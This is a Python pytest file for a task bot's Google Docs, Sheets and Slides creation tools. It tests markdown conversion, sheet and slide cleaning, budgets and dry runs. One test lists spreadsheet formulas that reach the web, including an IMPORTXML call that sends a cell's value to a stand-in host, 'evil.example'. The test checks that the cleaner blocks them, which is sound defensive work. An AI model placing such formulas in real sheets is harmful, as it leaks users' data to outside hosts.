"""Task bot Google files: the pure builders in task_google.py and the three create_* tools.

No Google call is made: the create functions are replaced by fakes and the task context lives
in pytest's tmp_path.
"""
import pytest

import task_actions as ta
import task_bot as tb
import task_google as tg

OWN = "igor.test@gmail.com"


@pytest.fixture
def ctx_file(tmp_path, monkeypatch):
    monkeypatch.setenv(ta.CONTEXT_ENV, str(tmp_path / "context.json"))

    def make(**kw):
        ta.save_context(ta.new_context(task_id="m1", allowed_emails=[], own_addresses=[OWN], **kw))
    return make


@pytest.fixture
def fake_google(monkeypatch):
    calls = []

    def fake(kind):
        def create(title, content):
            calls.append((kind, title, content))
            return {"id": f"{kind}-id", "url": f"https://docs.google.com/{kind}/d/{kind}-id/edit"}
        return create
    for kind in ("doc", "sheet", "slides"):
        monkeypatch.setattr(tg, f"create_{kind}", fake(kind))
    return calls


# --- builders ---------------------------------------------------------------------------------
def test_markdown_becomes_html_with_headings_lists_and_tables():
    html = tg.markdown_to_html("Plan <Q4>", "# Goals\n\n- **one**\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |")
    assert "<title>Plan &lt;Q4&gt;</title>" in html
    assert "<h1>Goals</h1>" in html and "<strong>one</strong>" in html and "<li>two</li>" in html
    assert "<table>" in html and "<td>1</td>" in html


def test_markdown_too_long_is_refused():
    with pytest.raises(tg.BadInput):
        tg.markdown_to_html("x", "a" * (tg.MAX_DOC_CHARS + 1))


def test_clean_tabs_names_numbers_and_formulas():
    tabs = tg.clean_tabs([
        {"name": "Q4: plan/budget", "rows": [["Item", "Cost"], ["Ads", 150], ["Total", "=SUM(B2:B2)"], [None, True]]},
        {"name": "q4  plan budget", "rows": []},   # same name once cleaned
        {"rows": [["x"]]},
    ])
    assert [t["name"] for t in tabs] == ["Q4  plan budget", "q4  plan budget (2)", "Sheet3"]
    assert tabs[0]["rows"] == [["Item", "Cost"], ["Ads", 150], ["Total", "=SUM(B2:B2)"], ["", True]]


@pytest.mark.parametrize("cell", ['=IMPORTXML("https://evil.example/?d="&A1, "//a")', "=image(\"x\")",
                                  " =HyperLink(\"https://x\")", "=IMPORTRANGE(\"id\",\"A1\")"])
def test_clean_tabs_blocks_formulas_that_reach_the_web(cell):
    with pytest.raises(tg.BadInput):
        tg.clean_tabs([{"name": "t", "rows": [[cell]]}])


def test_clean_tabs_text_that_merely_mentions_import_is_fine():
    assert tg.clean_tabs([{"name": "t", "rows": [["IMPORTXML(...) is blocked"]]}])[0]["rows"] == [["IMPORTXML(...) is blocked"]]


@pytest.mark.parametrize("tabs", [[], "rows", [{"name": "t", "rows": ["not a list"]}],
                                  [{"name": "t", "rows": [[0] * (tg.MAX_COLS + 1)]}],
                                  [{"name": str(i), "rows": []} for i in range(tg.MAX_TABS + 1)]])
def test_clean_tabs_rejects_bad_shapes(tabs):
    with pytest.raises(tg.BadInput):
        tg.clean_tabs(tabs)


def test_clean_slides_defaults_and_body_lines():
    slides = tg.clean_slides([{"layout": "Title", "title": " Q4 ", "body": "Igor\n\nNov 2026"},
                              {"title": "Why", "body": ["a", " ", "b"], "notes": "say more"}])
    assert slides == [{"layout": "title", "title": "Q4", "body": ["Igor", "Nov 2026"], "notes": ""},
                      {"layout": "content", "title": "Why", "body": ["a", "b"], "notes": "say more"}]
    with pytest.raises(tg.BadInput):
        tg.clean_slides([{"layout": "fancy"}])
    with pytest.raises(tg.BadInput):
        tg.clean_slides([])


def test_slide_requests_worked_by_hand():
    slides = tg.clean_slides([{"layout": "title", "title": "Q4", "body": "Igor"},
                              {"title": "Why", "body": ["a", "b"]},
                              {"layout": "section", "title": "Part 2"}])
    reqs = tg.slide_requests(slides, remove_id="p")
    kinds = [next(iter(r)) for r in reqs]
    assert kinds == ["createSlide", "insertText", "insertText",                       # title slide
                     "createSlide", "insertText", "insertText", "createParagraphBullets",  # content
                     "createSlide", "insertText",                                       # section, no body
                     "deleteObject"]
    first = reqs[0]["createSlide"]
    assert first["slideLayoutReference"] == {"predefinedLayout": "TITLE"}
    assert [m["layoutPlaceholder"]["type"] for m in first["placeholderIdMappings"]] == ["CENTERED_TITLE", "SUBTITLE"]
    assert reqs[5] == {"insertText": {"objectId": "slide_1_body", "text": "a\nb"}}
    assert [m["objectId"] for m in reqs[7]["createSlide"]["placeholderIdMappings"]] == ["slide_2_title"]
    assert reqs[-1] == {"deleteObject": {"objectId": "p"}}


def test_notes_requests_use_each_slides_notes_box():
    slides = tg.clean_slides([{"title": "A", "notes": "first"}, {"title": "B"}, {"title": "C", "notes": "third"}])
    pres = {"slides": [{"objectId": f"slide_{i}", "slideProperties": {"notesPage": {"notesProperties": {
        "speakerNotesObjectId": f"n{i}"}}}} for i in range(2)]}          # slide_2 missing: skipped, no crash
    assert tg.notes_requests(pres, slides) == [{"insertText": {"objectId": "n0", "text": "first"}}]


# --- tools ------------------------------------------------------------------------------------
def test_create_doc_records_the_link_and_cleans_em_dashes(ctx_file, fake_google):
    ctx_file()
    out = ta.tool_create_doc(title="Plan — Q4", content="# Hi — there")
    assert out["result"] == "created" and out["url"].endswith("doc-id/edit")
    assert fake_google == [("doc", "Plan, Q4", "# Hi, there")]
    action = ta.load_context()["actions"][0]
    assert action["file"]["url"] == out["url"] and out["url"] in action["text"]
    assert tb.derive_status(ta.load_context()) == "Done"


def test_create_tools_work_in_plan_mode_without_approval(ctx_file, fake_google):
    ctx_file(mode=ta.PLAN)
    assert ta.tool_create_sheet(title="Budget", tabs=[{"name": "A", "rows": [["x"]]}])["result"] == "created"
    assert ta.tool_create_slides(title="Deck", slides=[{"title": "One"}])["result"] == "created"
    assert [c[0] for c in fake_google] == ["sheet", "slides"]


def test_create_tools_reject_bad_input_without_spending_budget(ctx_file, fake_google):
    ctx_file()
    assert "invalid" in ta.tool_create_doc(title="x", content="   ")
    assert "invalid" in ta.tool_create_sheet(title="x", tabs=[{"name": "t", "rows": [["=IMAGE(\"u\")"]]}])
    assert "refused" in ta.tool_create_slides(title=" ", slides=[{"title": "a"}])
    ctx = ta.load_context()
    assert fake_google == [] and ctx["used"] == {} and ctx["actions"] == []


def test_create_budget_is_three_per_kind(ctx_file, fake_google):
    ctx_file()
    for _ in range(3):
        assert ta.tool_create_doc(title="d", content="c")["result"] == "created"
    assert "refused" in ta.tool_create_doc(title="d", content="c")
    assert ta.tool_create_sheet(title="s", tabs=[{"rows": [[1]]}])["result"] == "created"


def test_create_dry_run_makes_nothing(ctx_file, fake_google):
    ctx_file(dry_run=True)
    assert ta.tool_create_doc(title="d", content="c") == {"result": "created", "dry_run": True}
    assert fake_google == [] and "file" not in ta.load_context()["actions"][0]


def test_file_tools_are_offered_to_the_model():
    names = {t["name"] for t in ta.TOOLS}
    assert {"create_doc", "create_sheet", "create_slides"} <= names
    assert not names & set(ta.GATED)
